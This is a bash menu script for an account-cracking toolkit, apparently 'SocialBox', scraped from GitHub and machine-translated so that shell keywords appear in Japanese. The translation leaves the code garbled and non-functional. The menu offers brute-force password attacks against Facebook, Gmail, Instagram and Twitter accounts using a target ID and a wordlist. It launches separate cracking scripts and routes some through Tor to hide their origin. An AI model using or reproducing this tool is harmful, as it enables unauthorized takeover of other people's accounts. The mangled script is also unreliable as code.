＃！/ bin / bash
＃色
白= " \ 033 [1; 37m "
grey = " \ 033 [0; 37m "
紫= " \ 033 [0; 35m "
red = " \ 033 [1; 31m "
緑= " \ 033 [1; 32m "
yellow = " \ 033 [1; 33m "
パープル= " \ 033 [0; 35m "
シアン= " \ 033 [0; 36m "
カフェ= " \ 033 [0; 33m "
Fiuscha = " \ 033 [0; 35m "
blue = " \ 033 [1; 34m "
nc = " \ e [0m "
＃ルート特権
if [[ $ EUID  -ne 0]] ;  その後
        echo -e " $ redルート権限がありません。スクリプトをrootとして実行してください。$ nc "
        出口1
fi
＃インストール
睡眠1
echo -e "インストールの確認$ nc "
bash install-sb.sh
echo -e "チェックが完了しました[ $ green✓ $ nc ] $ nc  "
睡眠1
晴れ
＃スタートアップ
echo -e " $ green "
エコー " 		.▄▄・▄▄・▪▄▄▄・▄▄▌▄▄▄▄・▐▄• "
エコー " 		▐█▀。▪▐█▌■██▐█▀███•▐█▀█■■█▌█▌■ "
エコー " 		▄▀▀▀█▄▄█▀▄██▄▄▐█・▄█▀▀███■▐█▀▀█▄▄█▀▄・██・"
エコー " 		▐█▄■▐█▐█▌.▐▌▐███▌▐█▌▐█▪▐▌▐█▌▐▌██▄■▐█▐█▌▐▌■ 「」
エコー-e " 		 ▀▀▀▀▀█▄▀▪・▀▀▀▀▀▀▀▀.▀▀▀・▀▀▀▀▀█▄▀▪•▀▀▀▀ $ NC  $青のV1の$ NC "
echo -e " 	[+]               $ red Coded By Belahsan Ouerghi $ nc          		   [+] "
echo -e " 	[+] 		  $ red www.facebook.com/ouerghi.belahsan $ nc  		   [+] "
echo -e " 	[+] 		  $ red Greetz To All Pentesters $ nc           		   [+] "
echo -e " 	[+] $ red Special Greetz To $ nc：$ green {thelinuxchoice、Ha3MrX、Tunisian Eagles} $ nc [+] "
エコー " "
echo -e " $ yellowメニューから選択：$ nc "
エコー " "
echo -e " 		$ Cyan 1：ブルートフォースFacebookアカウント$ nc "
echo -e " 		$ Cyan 2：ブルートフォースGmailアカウント$ nc "
echo -e " 		$ Cyan 3：ブルートフォースInstagramアカウント$ nc "
echo -e " 		$ Cyan 4：ブルートフォースTwitterアカウント$ nc "
echo -e " 		$ Cyan 99：$ ncを終了します"
読み取り-p "選択>   " ch
if [ $ ch  = 1] ;  その後
echo -e " 			$ Cyan Facebook Brute Force $ nc "
echo -e " $ green "
read -p " Facebook ID /メールアドレス/ユーザー名/番号を入力してください：" id
read -p "ワードリストパスを入力してください："ワードリスト
echo -e " $ nc "
cd facebook
perl fb-brute.pl $ id  $ wordlist
echo -e "  		[+] $ yellow Brute Force Complete $ nc [ $ green✓ $ nc ] $ nc [+] "
echo -e " $ red "
読み-p 「ワナ・背面にメインメニュー[Y / N]：」チェック
echo -e " $ nc "
if [ $ check  =  " Y " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check  =  " y " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check  =  "はい" ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check  =  " yes " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check  =  " YES " ] ;  その後
cd .. && bash SocialBox.sh
そうしないと
出口1
fi
elif [ $ ch  = 2] ;  その後
echo -e " 			$ Cyan Gmail Brute Force $ nc "
CD Gemail-ハック
python gemailhack.py
echo -e "                [+] $ yellow Brute Force Complete $ nc [ $ green✓ $ nc ] $ nc [+] "
echo -e " $ red "
read -p "メインメニューに戻りたい[Y / n]：" check2
echo -e " $ nc "
if [ $ check2  =  " Y " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check2  =  " y " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check2  =  "はい" ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check2  =  " yes " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check2  =  " YES " ] ;  その後
cd .. && bash SocialBox.sh
そうしないと
出口1
fi
elif [ $ ch  = 3] ;  その後
echo -e " 			$ Cyan Instagram Brute Force $ nc "
cd instainsane /
睡眠0.025
	echo -e " 	[+] $ red Service Tor Stated $ nc [+] "
睡眠0.9
サービス開始
./instainsane.sh
echo -e "                [+] $ yellow Brute Force Complete $ nc [ $ green✓ $ nc ] $ nc [+] "
サービスtorstop
echo -e " 		[+] $ red Service Tor Stopped $ nc [+] "
echo -e " $ red "
read -p "メインメニューに戻りたい[Y / n]：" check3
echo -e " $ nc "
if [ $ check3  =  " Y " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check3  =  " y " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check3  =  "はい" ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check3  =  " yes " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check3  =  " YES " ] ;  その後
cd .. && bash SocialBox.sh
そうしないと
出口1
fi
elif [ $ ch  = 4] ;  その後
echo -e " 			$ Cyan Twitter Brute Force $ nc "
CD tweetshell /
睡眠0.025
        echo -e " 	[+] $ red Service Tor Stated $ nc [+] "
睡眠0.9
サービス開始
bashtweetshell.sh
echo -e "                [+] $ yellow Brute Force Complete $ nc [ $ green✓ $ nc ] $ nc [+] "
サービスtorstop
echo -e " 		[+] $ red Service Tor Stopped $ nc [+] "
echo -e " $ red "
read -p "メインメニューに戻りたい[Y / n]：" check4
echo -e " $ nc "
if [ $ check4  =  " Y " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check4  =  " y " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check4  =  "はい" ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check4  =  " yes " ] ;  その後
cd .. && bash SocialBox.sh
elif [ $ check4  =  " YES " ] ;  その後
cd .. && bash SocialBox.sh
そうしないと
出口1
fi
elif [ $ ch  == 99] ;  その後
echo -e " $ redプログラム終了... $ nc "
睡眠0.25
出口1
そうしないと
エコー 「見つかりません404、終了」
出口1
fi
©2020GitHub、Inc。
